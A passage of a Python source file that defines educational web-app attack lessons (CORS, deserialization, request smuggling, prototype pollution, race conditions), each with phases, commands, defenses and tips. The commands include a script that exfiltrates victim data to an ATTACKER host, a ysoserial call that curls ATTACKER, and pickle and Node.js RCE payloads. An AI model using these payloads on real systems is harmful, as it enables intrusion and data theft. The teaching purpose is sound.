      "4. Test subdomain: Origin: https://evil.target.com",
      "5. Build PoC page that fetches /api/user and exfils to attacker",
    ],
    "commands": {
      "Test reflection":    "curl -H 'Origin: https://evil.com' https://target.com/api/user -v 2>&1 | grep -i 'access-control'",
      "Test null origin":   "curl -H 'Origin: null' https://target.com/api/user -v",
      "PoC HTML page": (
        '<script>\n'
        'fetch("https://TARGET/api/me", {credentials:"include"})\n'
        '  .then(r=>r.text())\n'
        '  .then(d=>fetch("https://ATTACKER/?data="+btoa(d)))\n'
        '</script>'
      ),
      "Burp scanner":       "Active scan target — CORS misconfiguration checks built in",
      "CORStest tool":      "python3 corstest.py https://target.com",
    },
    "defense": (
      "✅ Strict CORS allowlist — only whitelist specific trusted origins\n"
      "✅ Never reflect arbitrary Origin header directly into ACAO\n"
      "✅ Never use ACAO: * with ACAC: true\n"
      "✅ Validate Origin server-side against a hardcoded allowlist\n"
      "✅ Use SameSite=Strict cookies to prevent cross-origin credential inclusion"
    ),
    "tips": [
      "The most critical case: ACAO reflects Origin AND ACAC: credentials=true",
      "null origin is allowed in sandboxed iframes — test it explicitly",
      "Subdomain takeover + CORS = devastating — if evil.target.com is takeable, it passes CORS",
      "CORS misconfig in /api/admin endpoints = silent admin data theft",
      "Some apps only check if Origin contains their domain: https://evil.target.com.attacker.com",
    ],
    "mitre": "T1557 — Adversary-in-the-Middle",
  },

  "insecure deserialization": {
    "title": "Insecure Deserialization",
    "tldr": "Tampering with serialized objects sent to the server — manipulate app logic or achieve RCE by deserializing attacker-controlled data.",
    "what": (
      "Deserialization converts stored/transmitted data back into objects. If an app deserializes "
      "untrusted user data without validation, attackers can craft malicious serialized payloads "
      "that manipulate app logic, bypass auth, or trigger RCE via gadget chains "
      "(pre-existing code paths that execute dangerous operations during deserialization)."
    ),
    "phases": [
      "1. Find — base64 blobs in cookies/params, Java serialized magic bytes (ac ed 00 05), PHP O: patterns",
      "2. Identify language/framework — Java, PHP, Python pickle, Ruby Marshal, .NET BinaryFormatter",
      "3. Modify — for PHP: change object properties, reconstruct serialized string",
      "4. Gadget chains — for Java: use ysoserial to generate RCE payloads",
      "5. Deliver — replace original serialized data with payload",
    ],
    "commands": {
      "Java magic bytes check":  "echo 'BASE64' | base64 -d | xxd | head  → look for: ac ed 00 05",
      "ysoserial (Java RCE)":    "java -jar ysoserial.jar CommonsCollections4 'curl http://ATTACKER/' | base64",
      "PHP unserialize test":    'O:4:"User":1:{s:4:"role";s:5:"admin";}',
      "PHP serialize (gen)":     "php -r \"echo serialize(array('role'=>'admin'));\"",
      "Python pickle RCE":       "import pickle,os; pickle.dumps(type('x',(object,),{'__reduce__':lambda s:(os.system,('id',))})())",
      "PHPGGC (PHP gadget)":     "php phpggc Laravel/RCE1 system id",
      "Burp Deserialization ext": "Install 'Java Deserialization Scanner' Burp extension",
      ".NET viewstate":          "Tamper ViewState if MachineKey known → ysoserial.net",
    },
    "defense": (
      "✅ Never deserialize untrusted data\n"
      "✅ Use allowlist of permitted classes during deserialization\n"
      "✅ Sign serialized data (HMAC) to detect tampering\n"
      "✅ Use safer data formats: JSON, XML with schema validation\n"
      "✅ Java: use ObjectInputFilter to restrict deserialized class types\n"
      "✅ Monitor for deserialization exceptions — often signal active exploitation"
    ),
    "tips": [
      "Java: ac ed 00 05 in hex OR rO0AB in base64 = Java serialized object — test ysoserial",
      "PHP: look for O:, a: patterns in cookies — classic PHP serialized data",
      "Python pickle is inherently unsafe — never unpickle untrusted data",
      "ysoserial gadget chains: try CommonsCollections1-7, Spring, Groovy, JBoss",
      "ViewState in .NET without validation key = trivial deserialization RCE",
    ],
    "mitre": "T1190 — Exploit Public-Facing Application",
  },

  # ══════════════════════════════════════════════════════════════════════════
  # TIER 3 — ADVANCED / SPECIALIZED
  # ══════════════════════════════════════════════════════════════════════════

  "request smuggling": {
    "title": "HTTP Request Smuggling",
    "tldr": "Desynchronizing frontend/backend HTTP parsing to inject hidden requests — bypass security controls, poison caches, hijack sessions.",
    "what": (
      "Request smuggling exploits discrepancies between how a frontend proxy (CDN, load balancer) "
      "and backend server parse HTTP request boundaries (Content-Length vs Transfer-Encoding). "
      "An attacker crafts an ambiguous request that the frontend processes as one request but the "
      "backend treats as two — 'smuggling' a hidden second request ahead of other users' traffic."
    ),
    "phases": [
      "1. Detect — send CL.TE or TE.CL timing probe — does response take 5-10s longer?",
      "2. Confirm — use Burp's HTTP Request Smuggler extension",
      "3. Exploit — capture other users' requests, bypass front-end access controls",
      "4. Cache poison — smuggled response poisons CDN cache for legitimate users",
    ],
    "commands": {
      "CL.TE probe": (
        "POST / HTTP/1.1\nHost: target.com\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nX"
      ),
      "TE.CL probe": (
        "POST / HTTP/1.1\nHost: target.com\nContent-Length: 3\nTransfer-Encoding: chunked\n\n1\nA\n0\n\n"
      ),
      "Burp extension":    "Install 'HTTP Request Smuggler' by James Kettle in Burp BApp store",
      "smuggler.py":       "python3 smuggler.py -u https://target.com/",
      "h2smuggler":        "python3 h2smuggler.py --proxy target.com ENDPOINT",
    },
    "defense": (
      "✅ Use HTTP/2 end-to-end (eliminates CL/TE ambiguity)\n"
      "✅ Normalize ambiguous requests at the front-end — reject if both CL and TE present\n"
      "✅ Ensure frontend and backend use same HTTP parsing library\n"
      "✅ Disable backend connection reuse if smuggling is suspected"
    ),
    "tips": [
      "Discovered and popularized by James Kettle (PortSwigger) — read his research papers",
      "HTTP/2 downgrade smuggling: H2.CL and H2.TE attacks still work on HTTP/2 frontends",
      "Use Burp's HTTP Request Smuggler extension — it automates detection completely",
      "Impact varies wildly — from response queue poisoning to full account takeover",
    ],
    "mitre": "T1190 — Exploit Public-Facing Application",
  },

  "prototype pollution": {
    "title": "Prototype Pollution",
    "tldr": "Injecting properties into JavaScript's Object.prototype — corrupt app behavior, bypass security checks, or achieve RCE in Node.js.",
    "what": (
      "JavaScript objects inherit from Object.prototype. If an app merges user-controlled JSON "
      "into an object without sanitization, an attacker can set __proto__ properties that flow "
      "to ALL objects in the app. Client-side: bypasses, XSS. Server-side (Node.js): RCE "
      "via process.mainModule gadget chains."
    ),
    "phases": [
      "1. Find — deep object merge functions, JSON.parse of user input into objects",
      "2. Inject — send {'__proto__': {'polluted': true}} in JSON body",
      "3. Confirm — {}['polluted'] === true (all new objects have the property)",
      "4. Escalate — client: bypass isAdmin checks | server: RCE via child_process gadgets",
    ],
    "commands": {
      "Basic test payload":    '{"__proto__": {"polluted": true}}',
      "Constructor path":      '{"constructor": {"prototype": {"polluted": true}}}',
      "Node.js RCE payload":   '{"__proto__": {"argv0": "node", "shell": "node", "env": {"NODE_OPTIONS": "--require /proc/self/fd/0"}, "data": "process.mainModule.require(\'child_process\').exec(\'id\')"}}}',
      "Client-side bypass":    '{"__proto__": {"isAdmin": true}}',
      "ppmap tool":            "ppmap --url https://target.com",
      "Burp scanner":          "Active scan catches prototype pollution in modern versions",
    },
    "defense": (
      "✅ Sanitize keys during object merge — reject __proto__, constructor, prototype\n"
      "✅ Use Object.create(null) for objects that shouldn't inherit from prototype\n"
      "✅ Use safe merge libraries (lodash 4.17.21+, immer with freeze)\n"
      "✅ Freeze Object.prototype: Object.freeze(Object.prototype)\n"
      "✅ Node.js: use --disallow-code-generation-from-strings flag"
    ),
    "tips": [
      "Server-side prototype pollution is harder to detect — responses may look normal",
      "ppmap automates both client and server-side prototype pollution scanning",
      "Lodash merge() was historically vulnerable — check for outdated lodash versions",
      "JSON.parse itself is safe — the vulnerability is in how parsed objects are merged",
      "Look for deep merge patterns in Express middleware and REST API body parsers",
    ],
    "mitre": "T1059.007 — JavaScript execution",
  },

  "race condition": {
    "title": "Race Condition",
    "tldr": "Sending concurrent requests to exploit timing windows in sequential logic — double-spend, bypass rate limits, duplicate rewards.",
    "what": (
      "Race conditions occur when an app performs a check-then-act sequence (read balance, "
      "deduct balance) that can be interrupted by concurrent requests. Classic: two simultaneous "
      "redemptions of a one-time coupon, double-spend on a gift card, bypass rate limit "
      "on password reset codes, or multiple account creations from one invite link."
    ),
    "phases": [
      "1. Find — one-time use tokens, coupons, gift cards, rate-limited endpoints, balance operations",
      "2. Prepare — set up the state (add coupon, have balance ready)",
      "3. Fire — send 20-50 concurrent identical requests simultaneously",
      "4. Observe — did any duplicate processing occur?",
      "5. Exploit — time attack precisely using Burp's Last-Byte Sync technique",
    ],
    "commands": {
      "Burp Turbo Intruder": (
        "Use race-single-packet-attack.py template\n"
        "engine.queue(target, gate='race1') × 50\n"
        "engine.openGate('race1')"
      ),
      "curl parallel":       "seq 1 20 | xargs -P20 -I% curl -s -X POST http://target/redeem -d 'code=GIFT50'",
      "Python threading":    (
        "import threading, requests\n"
        "[threading.Thread(target=lambda: requests.post(URL, data=DATA)).start() for _ in range(20)]"
      ),
      "ffuf parallel":       "ffuf -u http://target/redeem -X POST -d 'code=GIFT50' -w count.txt -rate 0",
    },
    "defense": (
      "✅ Atomic database transactions with proper locking\n"
      "✅ Optimistic/pessimistic locking on critical resources\n"
      "✅ Mark tokens as 'used' BEFORE processing, not after\n"
      "✅ Idempotency keys — reject duplicate operations with same key\n"
      "✅ Redis SETNX for distributed atomic operations"
    ),
    "tips": [
      "HTTP/2 single-packet attack (Burp Turbo Intruder) sends all requests in one TCP packet",
      "The window can be microseconds — automated concurrent requests are required",
      "Password reset race: multiple simultaneous reset requests may all generate valid tokens",
      "Account registration: race two registrations with same email — both may succeed",
      "James Kettle's 'Smashing the State Machine' research covers modern race condition techniques",
    ],
    "mitre": "T1499 — Endpoint Denial of Service / abuse of application logic",
  },

  # ── Alias mappings ─────────────────────────────────────────────────────────
  "sqli":                    None,  # handled by ATTCK_KEYWORD_MAP → find_lesson("sql injection")
  "cross site scripting":    None,
  "cross-site scripting":    None,
  "path traversal":          None,
  "traversal":               None,
  "deserialization":         None,
  "server side template":    None,
  "template injection":      None,
  "cmd injection":           None,
  "cmdi":                    None,
  "os command injection":    None,

} # END WEBAPP_LESSONS


# ── Alias resolution ──────────────────────────────────────────────────────────
_ALIASES = {
  "sqli":                   "sql injection",
  "cross site scripting":   "xss",
  "cross-site scripting":   "xss",
  "path traversal":         "directory traversal",
  "traversal":              "directory traversal",
  "deserialization":        "insecure deserialization",
  "server side template":   "ssti",
  "template injection":     "ssti",
  "cmd injection":          "command injection",
  "cmdi":                   "command injection",
  "os command injection":   "command injection",
  "lfi":                    "file inclusion",
  "rfi":                    "file inclusion",
  "jwt attack":             "jwt",
  "json web token":         "jwt",
  "cors misconfiguration":  "cors",
  "cors misconfig":         "cors",
  "insecure direct object": "idor",
  "object reference":       "idor",
  "request smuggling":      "request smuggling",
  "http smuggling":         "request smuggling",
  "proto pollution":        "prototype pollution",
  "race":                   "race condition",
  "ssrf":                   "ssrf",
  "server side request":    "ssrf",
  "xxe":                    "xxe",
  "xml injection":          "xxe",
  "xss injection":          "xss",
  "reflected xss":          "xss",
  "stored xss":             "xss",
}

def resolve_webapp_lesson(keyword: str):
  """Resolve aliases and return the correct WEBAPP_LESSONS entry."""
  kw = keyword.lower().strip()
  kw = _ALIASES.get(kw, kw)
  lesson = WEBAPP_LESSONS.get(kw)
  if lesson is None:
    # substring fallback
    for key, val in WEBAPP_LESSONS.items():
      if key and key in kw and val:
        return val
  return lesson
